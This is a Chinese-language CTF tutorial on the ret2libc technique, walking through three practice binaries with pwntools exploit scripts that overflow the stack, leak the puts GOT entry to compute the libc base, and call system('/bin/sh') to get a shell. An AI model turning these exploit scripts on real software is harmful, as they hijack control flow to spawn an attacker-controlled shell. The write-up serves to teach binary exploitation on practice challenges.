---
title: 【PWN】ret2libc
---

## 原理

ret2lic即劫持程序的控制流，使其执行libc中的函数，一般是返回到某个函数的plt处，或者某个函数的具体位置（函数对应got表的内容），大多情况下是执行system('/bin/sh')。

## 例题1

题目下载链接：https://pan.baidu.com/s/1DzkmINus__xu3_qkwoIPwQ 提取码：0000 

首先查看一下程序开了哪些安全保护

![image-20210105202149700](/images/ret2libc/1.png)

程序是小端序32位，开了NX防护。接着使用ida查看一下程序

![image-20210105202739929](/images/ret2libc/2.png)

程序有明显的栈溢出，在plt表中发现有system函数的地址和/bin/sh字符串

![image-20210105203242739](/images/ret2libc/3.png)

![image-20210105203513119](/images/ret2libc/4.png)

通过gdb调试确定字符串s的地址离ebp有多少字节，直接通过ida也能确定需要填充多少字符,，不过动态调试结果比较准

![image-20210105203911307](/images/ret2libc/5.png)

最后的exp如下：

```python
from pwn import *

context.log_level = 'debug'
p = process('./ret2libc1')
elf = ELF('./ret2libc1')

sys_addr = elf.plt['system']
bin_sh = elf.search('/bin/sh').next()

payload = cyclic(0x70) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh)

p.recv()
p.sendline(payload)

p.interactive()
```

## 例题2

题目下载链接：https://pan.baidu.com/s/1I9IOqD3Jq6RrghlUNL0wsg  提取码：0000 

这道题与例题1基本相似，只是程序中没有了/bin/sh字符串，我们需要通过gets函数手动写入/bin/sh字符串到一个可写可执行区域，通常在bss段，在ida找到一个地址

![image-20210105205900389](/images/ret2libc/6.png)

```python
from pwn import *

context.log_level = 'debug'
p = process('./ret2libc2')
elf = ELF('./ret2libc2')

sys_addr = elf.plt['system']
gets_addr = elf.plt['gets']
bss_addr = 0x0804A080

payload = cyclic(0x70) + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)

p.recv()
p.sendline(payload)
p.sendline('/bin/sh')

p.interactive()
```

## 例题3

题目下载链接：https://pan.baidu.com/s/1wk3JFQBHgVZ0vjfnQk60Ug  提取码：0000 

例题3相对于前面两道例题难度加大了不少，程序中既没有system函数的地址，也没有/bin/sh字符串，我们需要使用libc中的system函数和/bin/sh，题目已经将libc版本给了出来，这时需要泄露libc某个函数的地址。

先使用ida查看程序

![image-20210105213153494](/images/ret2libc/7.png)

主函数中并没有产生溢出，但有两个可以的函数，跟进去看看

![image-20210105213403543](/images/ret2libc/8.png)

See_something函数是打印给定地址的值，可以通过这个漏洞函数可以泄露libc函数的地址

![image-20210105213622064](/images/ret2libc/9.png)

Print_message函数的字符串拷贝存在栈溢出，又main函数可知src字符串长度最多可达256，远超过56。由于在libc中各函数地址的偏移是固定的，通过泄露出某个函数的真实地址，再减去该函数在libc中的地址就能得到libc函数中加载到内存的基址，这样就能计算出system函数和/bin/sh的地址。

exp如下：

```python
from pwn import *

context.log_level = 'debug'
p = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc-2.23.so')


p.recvuntil('(in dec) :')
p.sendline(str(elf.got['puts']))
puts_addr = p.recvuntil('/n', drop = True)[-10:]
p.recvuntil('for me :')

libc_base = int(puts_addr, 16) - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()

payload = cyclic(0x3c) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh)

p.sendline(payload)
p.interactive()
```

## 总结

实际上大部分题都需要我们自己获得system函数的地址，通常是通过libc的延迟绑定机制，泄露出已经执行过的函数的地址，而libc中的函数之间的相对偏移是固定的，有时候还需要返回到main函数或其他函数多次构造payload进行利用。